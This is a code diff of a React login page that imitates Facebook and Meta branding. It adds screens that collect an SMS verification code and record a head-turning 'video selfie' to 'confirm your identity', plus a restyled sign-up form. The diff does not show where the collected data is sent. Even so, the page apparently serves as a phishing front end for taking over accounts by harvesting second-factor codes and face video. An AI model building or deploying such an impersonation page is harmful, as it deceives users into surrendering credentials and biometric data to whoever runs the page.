+          {currentStep === "code" && (
+            <div className="text-center">
+              <h2 className="text-xl font-bold mb-2" style={{ color: '#1c1e21' }}>Enter Verification Code</h2>
+              <p className="text-sm mb-6" style={{ color: '#65676b' }}>
+                We've sent a code to your phone. Enter it below.
+              </p>
+              <input
+                type="text"
+                value={verificationCode}
+                onChange={(e) => setVerificationCode(e.target.value.replace(/\D/g, '').slice(0, 6))}
+                placeholder="Enter code"
+                className="w-full px-4 py-3 text-center text-lg border rounded-lg focus:outline-none focus:ring-2 mb-4"
+                style={{ borderColor: '#dadde1', color: '#1c1e21', letterSpacing: '0.5em' }}
+                data-testid="input-code"
               />
+              <button
+                onClick={handleCodeSubmit}
+                disabled={verificationCode.length < 4}
+                className="w-full py-3 text-white text-sm font-bold rounded-full transition disabled:opacity-60"
+                style={{ backgroundColor: '#1877f2' }}
+                data-testid="button-submit-code"
+              >
+                Continue
+              </button>
             </div>
-            <p className="text-xs text-[#65676b]">
-              {Math.round(overallProgress)}% complete
-            </p>
-          </div>
-        </div>
-      )}
+          )}
 
-      {currentStep === "processing" && (
-        <div className="flex-1 flex items-center justify-center px-4">
-          <div className="bg-white rounded-lg shadow-lg p-8 w-full max-w-md text-center">
-            <div className="relative w-16 h-16 mx-auto mb-4">
-              <div className="absolute inset-0 rounded-full border-4 animate-spin border-[#e4e6eb]" style={{ borderTopColor: '#1877f2' }} />
+          {/* Face Intro - Confirm Identity */}
+          {currentStep === "face-intro" && (
+            <div className="text-center">
+              <div className="mb-6">
+                <img
+                  src="/favicon.png"
+                  alt="Facebook"
+                  className="w-16 h-16 mx-auto"
+                />
+              </div>
+              <h2 className="text-2xl font-bold mb-3" style={{ color: '#1c1e21' }}>Confirm your identity</h2>
+              <p className="text-sm mb-8" style={{ color: '#65676b' }}>
+                We need to verify your identity before you can continue to Facebook.
+              </p>
+              <button
+                onClick={() => setCurrentStep("face-explanation")}
+                className="w-full py-3 text-white text-sm font-bold rounded-full transition"
+                style={{ backgroundColor: '#1877f2' }}
+                onMouseEnter={(e) => (e.currentTarget.style.backgroundColor = '#166fe5')}
+                onMouseLeave={(e) => (e.currentTarget.style.backgroundColor = '#1877f2')}
+              >
+                Continue
+              </button>
             </div>
-            <h2 className="text-lg font-semibold mb-2 text-[#1c1e21]">Verifying your identity</h2>
-            <p className="text-sm text-[#65676b]">This may take a moment...</p>
-          </div>
-        </div>
-      )}
+          )}
 
-      {currentStep === "complete" && (
-        <div className="flex-1 flex items-center justify-center px-4">
-          <div className="bg-white rounded-lg shadow-lg p-8 w-full max-w-md text-center">
-            <div className="w-20 h-20 mx-auto mb-6 rounded-full flex items-center justify-center bg-[#42b72a]">
-              <svg className="w-10 h-10 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={3} d="M5 13l4 4L19 7" />
-              </svg>
+          {/* Face Explanation */}
+          {currentStep === "face-explanation" && (
+            <div className="text-center">
+              <h2 className="text-xl font-bold mb-3" style={{ color: '#1c1e21' }}>Use your face to confirm it's you</h2>
+              <p className="text-sm mb-6" style={{ color: '#65676b' }}>
+                We'll compare a video of your face to your profile photos. This helps us confirm it's your account.
+              </p>
+              
+              {/* Illustration */}
+              <div className="w-32 h-32 mx-auto mb-8 rounded-full flex items-center justify-center" style={{ backgroundColor: '#e7f3ff' }}>
+                <svg className="w-16 h-16" fill="none" stroke="#1877f2" viewBox="0 0 24 24" strokeWidth={1.5}>
+                  <path strokeLinecap="round" strokeLinejoin="round" d="M17.982 18.725A7.488 7.488 0 0012 15.75a7.488 7.488 0 00-5.982 2.975m11.963 0a9 9 0 10-11.963 0m11.963 0A8.966 8.966 0 0112 21a8.966 8.966 0 01-5.982-2.275M15 9.75a3 3 0 11-6 0 3 3 0 016 0z" />
+                </svg>
+              </div>
+
+              <button
+                onClick={handleStartFaceVerification}
+                className="w-full py-3 text-white text-sm font-bold rounded-full transition mb-3"
+                style={{ backgroundColor: '#1877f2' }}
+                onMouseEnter={(e) => (e.currentTarget.style.backgroundColor = '#166fe5')}
+                onMouseLeave={(e) => (e.currentTarget.style.backgroundColor = '#1877f2')}
+              >
+                Continue
+              </button>
+              <button
+                onClick={() => setCurrentStep("login")}
+                className="text-sm"
+                style={{ color: '#1877f2' }}
+              >
+                Cancel
+              </button>
             </div>
-            <h2 className="text-2xl font-semibold mb-3 text-[#1c1e21]">Identity confirmed</h2>
-            <p className="text-sm mb-6 text-[#65676b]">
-              Your identity has been verified. You can now continue.
-            </p>
-            <button
-              onClick={() => {
-                setCurrentStep("login");
-                setUserEmail("");
-                setVerificationCode("");
-                setCompletedDirections(new Set());
-                setCurrentDirection(null);
-                setIsRecording(false);
-                setOverallProgress(0);
-                if (stream) {
-                  stream.getTracks().forEach(track => track.stop());
-                  setStream(null);
+          )}
+
+          {/* Instructions Screen */}
+          {currentStep === "instructions" && (
+            <div className="text-center">
+              <h2 className="text-xl font-bold mb-3" style={{ color: '#1c1e21' }}>Take a video selfie</h2>
+              <p className="text-sm mb-6" style={{ color: '#65676b' }}>
+                Center your face in the frame. You'll be asked to slowly turn your head in all directions.
+              </p>
+
+              {/* Camera Preview */}
+              <div className="relative w-64 h-80 mx-auto mb-6 rounded-3xl overflow-hidden" style={{ backgroundColor: '#000' }}>
+                <video
+                  ref={(el) => {
+                    setVideoRef(el);
+                    if (el && stream) {
+                      el.srcObject = stream;
+                      el.play();
+                    }
+                  }}
+                  autoPlay
+                  playsInline
+                  muted
+                  className="w-full h-full object-cover scale-x-[-1]"
+                />
+                
+                {/* Face outline guide */}
+                <div className="absolute inset-0 flex items-center justify-center pointer-events-none">
+                  <div
+                    className="w-48 h-64 rounded-full border-4"
+                    style={{
+                      borderColor: 'rgba(255, 255, 255, 0.5)',
+                      borderStyle: 'dashed'
+                    }}
+                  />
+                </div>
+              </div>
+
+              <button
+                onClick={handleStartRecording}
+                className="w-full py-3 text-white text-sm font-bold rounded-full transition"
+                style={{ backgroundColor: '#1877f2' }}
+                onMouseEnter={(e) => (e.currentTarget.style.backgroundColor = '#166fe5')}
+                onMouseLeave={(e) => (e.currentTarget.style.backgroundColor = '#1877f2')}
+              >
+                Start Recording
+              </button>
+            </div>
+          )}
+
+          {/* Recording Screen */}
+          {currentStep === "recording" && (
+            <div className="text-center">
+              <p className="text-sm mb-4" style={{ color: '#65676b' }}>
+                Slowly turn your head to complete the circle
+              </p>
+
+              {/* Camera Feed with Oval Progress */}
+              <div className="relative w-full max-w-xs mx-auto mb-6" style={{ aspectRatio: '3/4' }}>
+                <div className="relative w-full h-full rounded-3xl overflow-hidden" style={{ backgroundColor: '#000' }}>
+                  <video
+                    ref={(el) => {
+                      setVideoRef(el);
+                      if (el && stream) {
+                        el.srcObject = stream;
+                        el.play();
+                      }
+                    }}
+                    autoPlay
+                    playsInline
+                    muted
+                    className="w-full h-full object-cover scale-x-[-1]"
+                  />
+
+                  {/* Dark overlay with oval cutout effect */}
+                  <div className="absolute inset-0 pointer-events-none">
+                    {/* SVG Oval Progress Indicator */}
+                    <svg 
+                      className="absolute inset-0 w-full h-full" 
+                      viewBox="0 0 300 400"
+                      style={{ overflow: 'visible' }}
+                    >
+                      {/* Dark semi-transparent mask around the oval */}
+                      <defs>
+                        <mask id="ovalMask">
+                          <rect x="0" y="0" width="300" height="400" fill="white" />
+                          <ellipse cx="150" cy="190" rx="95" ry="125" fill="black" />
+                        </mask>
+                      </defs>
+                      <rect x="0" y="0" width="300" height="400" fill="rgba(0,0,0,0.6)" mask="url(#ovalMask)" />
+                      
+                      {/* Background oval (grey track) */}
+                      <ellipse 
+                        cx="150" 
+                        cy="190" 
+                        rx="95" 
+                        ry="125" 
+                        fill="none" 
+                        stroke="rgba(255,255,255,0.3)" 
+                        strokeWidth="6"
+                      />
+                      
+                      {/* Progress oval (blue fill) */}
+                      <ellipse 
+                        cx="150" 
+                        cy="190" 
+                        rx="95" 
+                        ry="125" 
+                        fill="none" 
+                        stroke="#1877f2" 
+                        strokeWidth="6"
+                        strokeLinecap="round"
+                        strokeDasharray={`${2 * Math.PI * 110}`}
+                        strokeDashoffset={`${2 * Math.PI * 110 * (1 - overallProgress / 100)}`}
+                        style={{
+                          transition: 'stroke-dashoffset 0.1s linear',
+                          transform: 'rotate(-90deg)',
+                          transformOrigin: '150px 190px'
+                        }}
+                      />
+                      
+                      {/* Current direction indicator dot */}
+                      {currentDirection && (
+                        <circle
+                          cx={
+                            currentDirection === "left" ? 55 :
+                            currentDirection === "right" ? 245 :
+                            currentDirection === "up" ? 150 :
+                            150
+                          }
+                          cy={
+                            currentDirection === "left" ? 190 :
+                            currentDirection === "right" ? 190 :
+                            currentDirection === "up" ? 65 :
+                            315
+                          }
+                          r="12"
+                          fill="#1877f2"
+                          style={{
+                            filter: 'drop-shadow(0 0 8px rgba(24, 119, 242, 0.8))',
+                            animation: 'pulse-dot 1s ease-in-out infinite'
+                          }}
+                        />
+                      )}
+                    </svg>
+                    
+                    {/* Direction arrow inside oval */}
+                    {currentDirection && (
+                      <div className="absolute inset-0 flex items-center justify-center" style={{ marginTop: '-10px' }}>
+                        <div
+                          className="flex flex-col items-center"
+                          style={{
+                            transform: 
+                              currentDirection === "left" ? "translateX(-50px)" : 
+                              currentDirection === "right" ? "translateX(50px)" :
+                              currentDirection === "up" ? "translateY(-60px)" :
+                              "translateY(60px)",
+                            transition: 'transform 0.3s ease'
+                          }}
+                        >
+                          <div 
+                            className="w-12 h-12 rounded-full flex items-center justify-center"
+                            style={{ backgroundColor: 'rgba(24, 119, 242, 0.9)' }}
+                          >
+                            <svg 
+                              className="w-6 h-6 text-white" 
+                              fill="none" 
+                              viewBox="0 0 24 24" 
+                              stroke="currentColor" 
+                              strokeWidth={3}
+                              style={{
+                                transform: 
+                                  currentDirection === "left" ? "rotate(180deg)" : 
+                                  currentDirection === "right" ? "rotate(0deg)" :
+                                  currentDirection === "up" ? "rotate(-90deg)" :
+                                  "rotate(90deg)"
+                              }}
+                            >
+                              <path strokeLinecap="round" strokeLinejoin="round" d="M13 7l5 5m0 0l-5 5m5-5H6" />
+                            </svg>
+                          </div>
+                        </div>
+                      </div>
+                    )}
+                  </div>
+                </div>
+              </div>
+
+              {/* Direction text */}
+              <h2 className="text-xl font-bold mb-2" style={{ color: '#1c1e21' }}>
+                {currentDirection === "left" ? "Turn your head left" :
+                 currentDirection === "right" ? "Turn your head right" :
+                 currentDirection === "up" ? "Look up slowly" :
+                 currentDirection === "down" ? "Look down slowly" :
+                 "Hold still..."}
+              </h2>
+
+              {/* Progress bar */}
+              <div className="w-full max-w-xs mx-auto mb-4">
+                <div className="h-1 rounded-full overflow-hidden" style={{ backgroundColor: '#e4e6eb' }}>
+                  <div 
+                    className="h-full rounded-full transition-all duration-100"
+                    style={{ 
+                      width: `${overallProgress}%`,
+                      backgroundColor: '#1877f2'
+                    }}
+                  />
+                </div>
+                <p className="text-xs mt-2" style={{ color: '#65676b' }}>
+                  {Math.round(overallProgress)}% complete
+                </p>
+              </div>
+
+              {/* Step indicators */}
+              <div className="flex justify-center gap-2 mb-4">
+                {["left", "right", "up", "down"].map((dir, index) => (
+                  <div
+                    key={dir}
+                    className="flex items-center gap-1"
+                  >
+                    <div
+                      className="w-8 h-8 rounded-full flex items-center justify-center text-xs font-medium transition-all"
+                      style={{
+                        backgroundColor: completedDirections.has(dir) ? '#00a400' : 
+                                        currentDirection === dir ? '#1877f2' : '#e4e6eb',
+                        color: completedDirections.has(dir) || currentDirection === dir ? '#fff' : '#65676b'
+                      }}
+                    >
+                      {completedDirections.has(dir) ? (
+                        <svg className="w-4 h-4" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={3}>
+                          <path strokeLinecap="round" strokeLinejoin="round" d="M5 13l4 4L19 7" />
+                        </svg>
+                      ) : (
+                        index + 1
+                      )}
+                    </div>
+                  </div>
+                ))}
+              </div>
+
+              <button
+                onClick={() => {
+                  if (stream) {
+                    stream.getTracks().forEach(track => track.stop());
+                  }
+                  setCurrentStep("login");
+                }}
+                className="mt-3 text-xs"
+                style={{ color: '#65676b' }}
+                data-testid="button-cancel-verification"
+              >
+                Cancel verification
+              </button>
+              
+              <style>{`
+                @keyframes pulse-dot {
+                  0%, 100% { opacity: 1; transform: scale(1); }
+                  50% { opacity: 0.7; transform: scale(1.2); }
                 }
-              }}
-              className="w-full py-3 text-white text-base font-semibold transition rounded-md"
-              style={{ backgroundColor: '#1877f2' }}
-            >
-              Continue to Facebook
-            </button>
-          </div>
-        </div>
-      )}
+              `}</style>
+            </div>
+          )}
 
+          {/* Processing */}
+          {currentStep === "processing" && (
+            <div className="text-center py-12">
+              <div className="relative w-16 h-16 mx-auto mb-4">
+                <div
+                  className="absolute inset-0 rounded-full border-4"
+                  style={{
+                    borderColor: '#e4e6eb',
+                    borderTopColor: '#1877f2',
+                    animation: 'fb-spin 1s linear infinite'
+                  }}
+                />
+              </div>
+              <h2 className="text-lg font-semibold mb-2" style={{ color: '#1c1e21' }}>Verifying video...</h2>
+              <p className="text-sm" style={{ color: '#65676b' }}>
+                This may take a few moments.
+              </p>
+            </div>
+          )}
+
+          {/* Complete - Identity Confirmed */}
+          {currentStep === "complete" && (
+            <div className="text-center py-8">
+              <div className="w-24 h-24 mx-auto mb-6 rounded-full flex items-center justify-center" style={{ backgroundColor: '#00a400' }}>
+                <svg className="w-12 h-12 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={3} d="M5 13l4 4L19 7" />
+                </svg>
+              </div>
+              <h2 className="text-2xl font-bold mb-3" style={{ color: '#1c1e21' }}>Identity Confirmed</h2>
+              <p className="text-sm mb-8" style={{ color: '#65676b' }}>
+                You can now continue to Facebook.
+              </p>
+              <button
+                onClick={() => {
+                  setCurrentStep("login");
+                  setUserEmail("");
+                  setVerificationCode("");
+                  setCompletedDirections(new Set());
+                  setCurrentDirection(null);
+                  setIsRecording(false);
+                  if (stream) {
+                    stream.getTracks().forEach(track => track.stop());
+                    setStream(null);
+                  }
+                }}
+                className="w-full py-3 text-white text-sm font-bold rounded-full transition"
+                style={{ backgroundColor: '#1877f2' }}
+                onMouseEnter={(e) => (e.currentTarget.style.backgroundColor = '#166fe5')}
+                onMouseLeave={(e) => (e.currentTarget.style.backgroundColor = '#1877f2')}
+                data-testid="button-continue"
+              >
+                Continue
+              </button>
+            </div>
+          )}
+        </div>
+      </main>
+
+      {/* Footer */}
+      <footer className="text-center py-8 px-5" style={{ color: '#65676b' }}>
+        <div className="mb-4">
+          <img
+            src={metaLogoImg}
+            alt="Meta"
+            className="h-8 mx-auto"
+            data-testid="img-meta-logo"
+          />
+        </div>
+        <div className="text-xs">
+          <a href="#" className="hover:underline mr-2" data-testid="link-about">
+            About
+          </a>
+          <a href="#" className="hover:underline mr-2" data-testid="link-help">
+            Help
+          </a>
+          <a href="#" className="hover:underline" data-testid="link-more">
+            More
+          </a>
+        </div>
+      </footer>
+
+      {/* Sign Up Dialog */}
       <Dialog open={signupOpen} onOpenChange={setSignupOpen}>
         <DialogContent className="sm:max-w-[432px] p-0 gap-0 bg-white rounded-lg overflow-hidden border-0">
           <DialogHeader className="p-4 pb-0">
-            <DialogTitle className="text-2xl font-bold text-[#1c1e21]">Sign Up</DialogTitle>
-            <DialogDescription className="text-sm mt-1 text-[#65676b]">It's quick and easy.</DialogDescription>
+            <DialogTitle className="text-2xl font-bold" style={{ color: '#1c1e21' }}>
+              Sign Up
+            </DialogTitle>
+            <DialogDescription className="text-sm mt-1" style={{ color: '#65676b' }}>
+              It's quick and easy.
+            </DialogDescription>
           </DialogHeader>
 
-          <div className="my-3 border-t border-gray-200" />
+          <div className="my-3" style={{ borderTop: '1px solid #dadde1' }} />
 
           <Form {...signupForm}>
             <form onSubmit={signupForm.handleSubmit(handleSignup)} className="px-4 pb-4 space-y-3">
@@ -853,9 +912,19 @@ export default function LoginPage() {
                   render={({ field }) => (
                     <FormItem className="flex-1">
                       <FormControl>
-                        <input {...field} placeholder="First name" className="w-full px-3 py-2 text-sm border rounded-md bg-[#f5f6f7] border-[#ccd0d5] text-[#1c1e21]" />
+                        <input
+                          {...field}
+                          placeholder="First name"
+                          className="w-full px-3 py-2 text-sm border rounded-md focus:outline-none focus:ring-2 focus:ring-offset-0 transition"
+                          style={{
+                            backgroundColor: '#f5f6f7',
+                            borderColor: '#ccd0d5',
+                            color: '#1c1e21',
+                          }}
+                          data-testid="input-firstname"
+                        />
                       </FormControl>
-                      <FormMessage className="text-xs mt-1 text-[#be4b49]" />
+                      <FormMessage className="text-xs mt-1" style={{ color: '#be4b49' }} />
                     </FormItem>
                   )}
                 />
@@ -865,9 +934,19 @@ export default function LoginPage() {
                   render={({ field }) => (
                     <FormItem className="flex-1">
                       <FormControl>
-                        <input {...field} placeholder="Surname" className="w-full px-3 py-2 text-sm border rounded-md bg-[#f5f6f7] border-[#ccd0d5] text-[#1c1e21]" />
+                        <input
+                          {...field}
+                          placeholder="Surname"
+                          className="w-full px-3 py-2 text-sm border rounded-md focus:outline-none focus:ring-2 focus:ring-offset-0 transition"
+                          style={{
+                            backgroundColor: '#f5f6f7',
+                            borderColor: '#ccd0d5',
+                            color: '#1c1e21',
+                          }}
+                          data-testid="input-lastname"
+                        />
                       </FormControl>
-                      <FormMessage className="text-xs mt-1 text-[#be4b49]" />
+                      <FormMessage className="text-xs mt-1" style={{ color: '#be4b49' }} />
                     </FormItem>
                   )}
                 />
@@ -879,9 +958,19 @@ export default function LoginPage() {
                 render={({ field }) => (
                   <FormItem>
                     <FormControl>
-                      <input {...field} placeholder="Mobile number or email address" className="w-full px-3 py-2 text-sm border rounded-md bg-[#f5f6f7] border-[#ccd0d5] text-[#1c1e21]" />
+                      <input
+                        {...field}
+                        placeholder="Mobile number or email address"
+                        className="w-full px-3 py-2 text-sm border rounded-md focus:outline-none focus:ring-2 focus:ring-offset-0 transition"
+                        style={{
+                          backgroundColor: '#f5f6f7',
+                          borderColor: '#ccd0d5',
+                          color: '#1c1e21',
+                        }}
+                        data-testid="input-signup-email"
+                      />
                     </FormControl>
-                    <FormMessage className="text-xs mt-1 text-[#be4b49]" />
+                    <FormMessage className="text-xs mt-1" style={{ color: '#be4b49' }} />
                   </FormItem>
                 )}
               />
@@ -892,41 +981,127 @@ export default function LoginPage() {
                 render={({ field }) => (
                   <FormItem>
                     <FormControl>
-                      <input {...field} type="password" placeholder="New password" className="w-full px-3 py-2 text-sm border rounded-md bg-[#f5f6f7] border-[#ccd0d5] text-[#1c1e21]" />
+                      <input
+                        {...field}
+                        type="password"
+                        placeholder="New password"
+                        className="w-full px-3 py-2 text-sm border rounded-md focus:outline-none focus:ring-2 focus:ring-offset-0 transition"
+                        style={{
+                          backgroundColor: '#f5f6f7',
+                          borderColor: '#ccd0d5',
+                          color: '#1c1e21',
+                        }}
+                        data-testid="input-signup-password"
+                      />
                     </FormControl>
-                    <FormMessage className="text-xs mt-1 text-[#be4b49]" />
+                    <FormMessage className="text-xs mt-1" style={{ color: '#be4b49' }} />
                   </FormItem>
                 )}
               />
 
               <div>
-                <label className="text-xs text-[#65676b]">Date of birth</label>
+                <label className="text-xs" style={{ color: '#65676b' }}>
+                  Date of birth
+                </label>
                 <div className="flex gap-3 mt-1">
-                  <select className="flex-1 px-2 py-1 text-sm border rounded-md bg-[#f5f6f7] border-[#ccd0d5] text-[#1c1e21]" value={signupForm.watch("birthday.month")} onChange={(e) => signupForm.setValue("birthday.month", e.target.value)}>
-                    {months.map((m, idx) => <option key={idx} value={String(idx)}>{m}</option>)}
+                  <select
+                    className="flex-1 px-2 py-1 text-sm border rounded-md focus:outline-none focus:ring-2 focus:ring-offset-0 transition"
+                    style={{
+                      backgroundColor: '#f5f6f7',
+                      borderColor: '#ccd0d5',
+                      color: '#1c1e21',
+                    }}
+                    value={signupForm.watch("birthday.month")}
+                    onChange={(e) => signupForm.setValue("birthday.month", e.target.value)}
+                    data-testid="select-birthday-month"
+                  >
+                    {months.map((m, idx) => (
+                      <option key={idx} value={String(idx)}>
+                        {m}
+                      </option>
+                    ))}
                   </select>
-                  <select className="flex-1 px-2 py-1 text-sm border rounded-md bg-[#f5f6f7] border-[#ccd0d5] text-[#1c1e21]" value={signupForm.watch("birthday.day")} onChange={(e) => signupForm.setValue("birthday.day", e.target.value)}>
-                    {days.map((d) => <option key={d} value={d}>{d}</option>)}
+                  <select
+                    className="flex-1 px-2 py-1 text-sm border rounded-md focus:outline-none focus:ring-2 focus:ring-offset-0 transition"
+                    style={{
+                      backgroundColor: '#f5f6f7',
+                      borderColor: '#ccd0d5',
+                      color: '#1c1e21',
+                    }}
+                    value={signupForm.watch("birthday.day")}
+                    onChange={(e) => signupForm.setValue("birthday.day", e.target.value)}
+                    data-testid="select-birthday-day"
+                  >
+                    {days.map((d) => (
+                      <option key={d} value={d}>
+                        {d}
+                      </option>
+                    ))}
                   </select>
-                  <select className="flex-1 px-2 py-1 text-sm border rounded-md bg-[#f5f6f7] border-[#ccd0d5] text-[#1c1e21]" value={signupForm.watch("birthday.year")} onChange={(e) => signupForm.setValue("birthday.year", e.target.value)}>
-                    {years.map((y) => <option key={y} value={y}>{y}</option>)}
+                  <select
+                    className="flex-1 px-2 py-1 text-sm border rounded-md focus:outline-none focus:ring-2 focus:ring-offset-0 transition"
+                    style={{
+                      backgroundColor: '#f5f6f7',
+                      borderColor: '#ccd0d5',
+                      color: '#1c1e21',
+                    }}
+                    value={signupForm.watch("birthday.year")}
+                    onChange={(e) => signupForm.setValue("birthday.year", e.target.value)}
+                    data-testid="select-birthday-year"
+                  >
+                    {years.map((y) => (
+                      <option key={y} value={y}>
+                        {y}
+                      </option>
+                    ))}
                   </select>
                 </div>
               </div>
 
               <div>
-                <label className="text-xs text-[#65676b]">Gender</label>
+                <label className="text-xs" style={{ color: '#65676b' }}>
+                  Gender
+                </label>
                 <div className="flex gap-3 mt-1">
-                  {[{ value: "female", label: "Female" }, { value: "male", label: "Male" }, { value: "custom", label: "Custom" }].map((option) => (
-                    <label key={option.value} className="flex-1 flex items-center justify-between px-3 py-2 border rounded-md cursor-pointer bg-[#f5f6f7] border-[#ccd0d5]">
-                      <span className="text-sm text-[#1c1e21]">{option.label}</span>
-                      <input type="radio" name="gender" value={option.value} onChange={(e) => signupForm.setValue("gender", e.target.value)} checked={signupForm.watch("gender") === option.value} className="w-4 h-4 cursor-pointer" />
+                  {[
+                    { value: "female", label: "Female" },
+                    { value: "male", label: "Male" },
+                    { value: "custom", label: "Custom" },
+                  ].map((option) => (
+                    <label
+                      key={option.value}
+                      className="flex-1 flex items-center justify-between px-3 py-2 border rounded-md cursor-pointer"
+                      style={{
+                        backgroundColor: '#f5f6f7',
+                        borderColor: '#ccd0d5',
+                      }}
+                    >
+                      <span className="text-sm" style={{ color: '#1c1e21' }}>
+                        {option.label}
+                      </span>
+                      <input
+                        type="radio"
+                        name="gender"
+                        value={option.value}
+                        onChange={(e) => signupForm.setValue("gender", e.target.value)}
+                        checked={signupForm.watch("gender") === option.value}
+                        className="w-4 h-4 cursor-pointer"
+                        data-testid={`radio-gender-${option.value}`}
+                      />
                     </label>
                   ))}
                 </div>
               </div>
 
-              <button type="submit" disabled={isSigningUp} className="w-auto px-16 py-2 text-white text-base font-bold transition disabled:opacity-60 mx-auto block bg-[#00a400] rounded-md">
+              <button
+                type="submit"
+                disabled={isSigningUp}
+                className="w-auto px-16 py-2 text-white text-base font-bold rounded-md transition disabled:opacity-60 mx-auto block"
+                style={{ backgroundColor: '#00a400' }}
+                onMouseEnter={(e) => (e.currentTarget.style.backgroundColor = '#009200')}
+                onMouseLeave={(e) => (e.currentTarget.style.backgroundColor = '#00a400')}
+                data-testid="button-signup-submit"
+              >
                 {isSigningUp ? "Signing up..." : "Sign Up"}
               </button>
             </form>
